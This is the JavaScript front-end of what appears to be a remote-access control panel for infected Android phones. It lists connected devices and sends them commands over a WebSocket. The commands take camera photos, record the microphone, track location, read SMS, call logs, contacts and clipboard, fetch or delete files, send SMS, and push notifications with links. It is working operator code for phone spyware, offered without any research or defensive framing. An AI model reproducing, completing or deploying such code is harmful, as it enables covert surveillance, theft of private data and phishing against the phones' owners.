document.addEventListener('DOMContentLoaded', () => {
    // --- Element References ---
    const statusDiv = document.getElementById('connection-status');
    const statusText = statusDiv.querySelector('span').nextSibling;
    const deviceListDiv = document.getElementById('device-list');
    const deviceCountSpan = document.getElementById('device-count');
    const logOutputDiv = document.getElementById('log-output');
    const modal = document.getElementById('command-modal');
    const modalTitle = document.getElementById('modal-title');
    const modalBody = document.getElementById('modal-body');
    const closeModalButton = modal.querySelector('.close-button');
    const commandInput = document.getElementById('command-input');
    const sendInputCommandButton = document.getElementById('send-input-command');

    let socket;
    let selectedUuid = null;
    let commandWithInput = null;

    // --- Command Definitions ---
    // Defines all available commands, their names, and if they need user input.
    const commands = [
        { name: 'Apps', command: 'apps' },
        { name: 'Device Info', command: 'device_info' },
        { name: 'Clipboard', command: 'clipboard' },
        { name: 'Main Camera', command: 'camera_main' },
        { name: 'Selfie Camera', command: 'camera_selfie' },
        { name: 'Location', command: 'location' },
        { name: 'Calls', command: 'calls' },
        { name: 'Contacts', command: 'contacts' },
        { name: 'Vibrate', command: 'vibrate' },
        { name: 'Messages', command: 'messages' },
        { name: 'Stop Audio', command: 'stop_audio' },
        { name: 'Get File', command: 'file', input: 'Enter file path (e.g., DCIM/Camera)' },
        { name: 'Delete File', command: 'delete_file', input: 'Enter file path to delete' },
        { name: 'Microphone', command: 'microphone', input: 'Enter recording duration in seconds' },
        { name: 'Toast', command: 'toast', input: 'Enter toast message' },
        { name: 'Show Notification', command: 'show_notification', input: 'Enter title/link (e.g., New Message/https://google.com)' },
        { name: 'Send Message', command: 'send_message', input: 'Enter number/message' },
        { name: 'Play Audio', command: 'play_audio', input: 'Enter direct audio URL' },
    ];

    /**
     * Connects to the WebSocket server.
     * Automatically tries to reconnect on failure.
     */
    function connect() {
        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        // Connect to the special '/panel' path
        socket = new WebSocket(`${wsProtocol}//${window.location.host}/panel`);

        socket.onopen = () => {
            statusDiv.className = 'status-connected';
            statusText.textContent = ' ONLINE';
            addLog('✅ Connected to server.', 'system');
        };

        socket.onclose = () => {
            statusDiv.className = 'status-disconnected';
            statusText.textContent = ' OFFLINE';
            addLog('❌ Connection lost. Reconnecting in 5 seconds...', 'error');
            setTimeout(connect, 5000);
        };

        socket.onerror = (error) => {
            console.error('WebSocket Error:', error);
            addLog('A connection error occurred.', 'error');
        };

        socket.onmessage = (event) => {
            const data = JSON.parse(event.data);
            handleServerMessage(data);
        };
    }

    /**
     * Handles all incoming messages from the server.
     * @param {object} data - The parsed JSON data from the server.
     */
    function handleServerMessage({ type, payload }) {
        switch (type) {
            case 'initial_device_list':
                deviceListDiv.innerHTML = '';
                payload.forEach(renderDevice);
                updateDeviceCount();
                break;
            case 'device_connected':
                addLog(`📱 New device connected: ${payload.model}`, 'system');
                renderDevice(payload);
                updateDeviceCount();
                break;
            case 'device_disconnected':
                const card = document.getElementById(payload.uuid);
                if (card) {
                    addLog(`🔌 Device disconnected: ${card.querySelector('h4').textContent}`, 'error');
                    card.remove();
                    updateDeviceCount();
                }
                break;
            case 'text_received':
                addLog(`📋 Clipboard/Text: <pre>${payload.text}</pre>`, 'info', payload.deviceName);
                break;
            case 'location_received':
                addLog(`📍 Location: <a href="https://www.google.com/maps?q=${payload.lat},${payload.lon}" target="_blank">View on Map</a>`, 'info', payload.deviceName);
                break;
            case 'file_received':
            case 'device_log':
                addLog(payload.message, 'info', payload.deviceName);
                break;
        }
    }

    /**
     * Renders a device card in the UI.
     * @param {object} device - The device information.
     */
    function renderDevice(device) {
        let card = document.getElementById(device.uuid);
        if (!card) {
            card = document.createElement('div');
            card.id = device.uuid;
            card.className = 'device-card';
            card.addEventListener('click', () => openCommandModal(device));
            deviceListDiv.appendChild(card);
        }
        card.innerHTML = `
            <h4>${device.model}</h4>
            <div class="device-info">
                <p><strong>Battery:</strong> ${device.battery}%</p>
                <p><strong>Android:</strong> ${device.version}</p>
                <p><strong>Provider:</strong> ${device.provider}</p>
                <p><strong>UUID:</strong> ${device.uuid}</p>
            </div>
        `;
    }

    /**
     * Displays the command modal for a selected device.
     * @param {object} device - The device to send commands to.
     */
    function openCommandModal(device) {
        selectedUuid = device.uuid;
        modalTitle.textContent = `Commands for ${device.model}`;
        modalBody.innerHTML = ''; // Clear previous buttons

        commands.forEach(cmd => {
            const button = document.createElement('button');
            button.className = 'command-button';
            button.textContent = cmd.name;
            button.onclick = () => {
                if (cmd.input) {
                    commandWithInput = cmd.command;
                    commandInput.placeholder = cmd.input;
                    commandInput.focus();
                } else {
                    sendCommand(cmd.command);
                    modal.style.display = 'none'; // Close modal for simple commands
                }
            };
            modalBody.appendChild(button);
        });
        
        modal.style.display = 'flex';
    }

    /**
     * Sends a command object to the server via WebSocket.
     * @param {string} command - The base command string.
     * @param {string|null} parameter - The optional parameter for the command.
     */
    function sendCommand(command, parameter = null) {
        let fullCommand = command;
        if (parameter) {
            fullCommand += `:${parameter}`;
        }

        socket.send(JSON.stringify({
            type: 'command',
            payload: {
                uuid: selectedUuid,
                command: fullCommand
            }
        }));

        addLog(`🚀 Sending command '${fullCommand}'`, 'system');

        // Reset input field
        commandInput.value = '';
        commandInput.placeholder = 'Enter parameter for command...';
        commandWithInput = null;
    }

    // --- UI Helpers ---
    function addLog(message, type = 'info', deviceName = '') {
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;
        const timestamp = new Date().toLocaleTimeString();
        let finalMessage = `[${timestamp}] `;
        if (deviceName) finalMessage += `<strong>${deviceName}:</strong> `;
        finalMessage += message;
        entry.innerHTML = finalMessage;
        logOutputDiv.appendChild(entry);
        logOutputDiv.scrollTop = logOutputDiv.scrollHeight;
    }

    function updateDeviceCount() {
        deviceCountSpan.textContent = deviceListDiv.children.length;
    }

    // --- Event Listeners ---
    sendInputCommandButton.addEventListener('click', () => {
        if(commandWithInput && commandInput.value){
            sendCommand(commandWithInput, commandInput.value);
        }
    });

    commandInput.addEventListener('keypress', (e) => {
        if(e.key === 'Enter' && commandWithInput && commandInput.value) {
            sendCommand(commandWithInput, commandInput.value);
        }
    });

    closeModalButton.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    // --- Initial Kickoff ---
    connect();
});
